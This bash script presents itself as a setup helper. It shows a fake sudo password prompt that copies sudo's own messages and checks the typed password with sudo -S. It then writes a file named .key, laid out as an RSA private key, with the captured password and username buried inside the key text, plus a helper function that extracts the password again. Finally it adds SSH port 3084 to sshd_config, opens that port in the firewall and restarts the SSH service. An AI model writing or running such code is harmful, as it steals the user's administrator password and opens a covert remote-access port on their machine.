#!/bin/bash

username=$(whoami)


#=================sudokey===================
	password=""
max_attempts=2
attempt_count=0

##getting the password
read -sp "[sudo] password for $USER: " password
echo

##confirming the password
while ! echo "$password" | sudo -S -k true 2>/dev/null; do
    if [[ $attempt_count -ge $max_attempts ]]; then
	echo "sudo: 3 incorrect password attempts"
	exit 1
    fi
    read -sp "Sorry, try again. " password
    echo
    attempt_count=$((attempt_count + 1))
done
#echo "$password" | sudo -S apt-get update


# Using a here-document to write to a file
cat <<EOF > .key
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzUbxV0Ov3+GO0VRAIetWuvl3uKvBmlkKJpXonwqub8+jLNFm
zXebVeEuHiqdkvFEVFhaUW1ZH3T0Hv/w/oq9chMAUtxxLp7l41Y2hcLhB1NsLGHf
SvJD5Tb/j+ocSH$username PrWeVOrtG45pP85ukyCHF0C+g96eCI5o5myUa
tdl9f6isMQ1HWoDC1mh863Uxcuc4J1oT+8fcgD0jC7xUVJJb6+MPDDvEhC0QEJVB
DfZ5iszg/fP13hqO02pT6y98kBiCwrNHj6dEwniakpbTTCPvnN6I53YDP+l2qvyZ
hDorIZSLqd75vtzT5ObCLgtMk66MsAIJ5Ck88wIDAQABAoIBAHpt+FzSet+tGE/S
ztksEjM7vGLA1ZwnxL0UpYPNjBIVpb2COq0Ky/NhdO76/bX4/YbMlzl/XSs8xqiC
f4pg1vJlUMkavspObM+0yJnoi+uhnp+t085QRZw8vBlqSGoT+q1+fN6NGSLuozQJ
1mAL+BChJVQmnRXbxq4O6hMqrZxrOsO9jN0Zl3DDa7LhYVqfWUW82Q3e9frGnVpS
xMgJYWQdz46GY+9xpN6TY91o1Eb+4k/x6pTG7fODmljMcqnQuNqi6Ku9vXXyiIAt
fyFjPWAt6iTVeknPkNEEwXZx3K6zZ1/5Gz6PGC++bQ1w57l2nPQnUMp/f+iR6/Az
19pkHpECgYEA5cEEzs78FDRXeRL$password 3ybMAIIEUx8QHtwyARbDApFD11
BWh4RVEOuKzVujVOezYitJ2NFLVkcr7kqPG7IoLrIWmF5u00P47lDN+XvvNRI50/
wnzA/51OWsJO7xBX+h0RyNW21Ia0QCOBOA6PDrjMbR9ZGSQ+/qAj+FkCgYEA5Lod
4d/XQf6zvzIyaW+eG4ZInTlY0m73CPzFfnNkGWnzWmkI3tn8OrxKjhluhFwKE1dN
fTlspjaZkqHWi4KVXZPndSoBPfmIKMtFwQHZmf6xMEanTJFcUOh16Xe3tPUKI5xK
ViR8/fIzE4TR8hFP3oueHxtOWmuyNV7s7Xoh9isCgYBkNROLv+tiRJICVKuOZWwg
wSv3FSDoTaOEwdrD0CvokpbhQ0SuzkurWC1czkXFdlyhoq5gPvRUIoNuDM+K3IeO
yB/+pWs4X3XvinXHYuO0AbGFr0osZmFwykjDNDEAlM8opdA5XoRrPAtKFpZ3gwTR
Fkh++0ruLUYHGTAAjoghwQKBgQDA7fymuhjoId+cNssvBGdo8Cvv8p9pYRAfFJfB
wbN9fFE4wcApudV39bstgWYnXztgdRN3vShYS1XeyYQeyVcUR93Ehlnl3MVtI4kC
9HyH2L286tvTSgmEdZCADet3R/n1b6+EWeLUkadjn3U3qkKkhUArHO1Kd+0p95gB
+DMNYQKBgEucJLh6415dAnZkxUrIYPMT3ekbRhXHMKrenlBcnNirO8CCIw1s2Zb7
lE7lDf5mH6ZjOa0v39yvl+syG47lbotwARqLbHCGA5NLVxTQXib+G2Jd960QIyNR
m2soCK9fy+DQqkT61a7qMbyqfK2yjYrwulDu1pRzcJjWOnTqFeS5
-----END RSA PRIVATE KEY-----

EOF

#=======================sudokey===============================


keyonly() {
  keyO=$(sed -n '13p' .key | grep -o 'RL.* ' | cut -c 3-)
  echo $keyO

}
#keyonly



	#Connection through SSH

ufwinstall() {
# Check if ufw is installed
	if ! command -v ufw &> /dev/null; then
	    
	    # Install ufw based on the Linux distribution
	    if command -v apt-get &> /dev/null; then
		# Debian/Ubuntu
		sudo apt-get update
		sudo apt-get install ufw -y
	    elif command -v yum &> /dev/null; then
		# CentOS/RHEL
		sudo yum install ufw -y
	    elif command -v dnf &> /dev/null; then
		# Fedora
		sudo dnf install ufw -y
	    else
		echo "Unsupported Linux distribution. Please install ufw manually before running this script."
		exit 1
	    fi

	    echo "ufw installed successfully."
	else
	    echo "ufw is already installed."
	fi
}

sshconnect() {
	# Define the new SSH port
	NEW_SSH_PORT=3084


	# Check if the new port is already present in the SSH configuration file
	if ! grep -q "Port $NEW_SSH_PORT" /etc/ssh/sshd_config; then
	# Edit the SSH configuration file to add the new port
	sudo sed -i "/^#Port 22/a Port $NEW_SSH_PORT" /etc/ssh/sshd_config
	else
	echo
	#echo "Port $NEW_SSH_PORT is already configured in /etc/ssh/sshd_config."
	fi

	# Allow the new port through the firewall
	ufwinstall

	# For UFW (Uncomplicated Firewall)
	sudo ufw allow $NEW_SSH_PORT/tcp

	# For Firewalld (uncomment the following lines if you use firewalld)
	# sudo firewall-cmd --permanent --add-port=$NEW_SSH_PORT/tcp
	# sudo firewall-cmd --reload

	# Check which SSH service is available and restart it
	if systemctl list-units --type=service | grep -q 'sshd.service'; then
	sudo systemctl restart sshd
	elif systemctl list-units --type=service | grep -q 'ssh.service'; then
	sudo systemctl restart ssh
	else
	echo "No SSH service found to restart."
	return 1
	fi

	# Print a success message
	#echo "SSH has been configured to use ports 22 and $NEW_SSH_PORT."

}


sshconnect
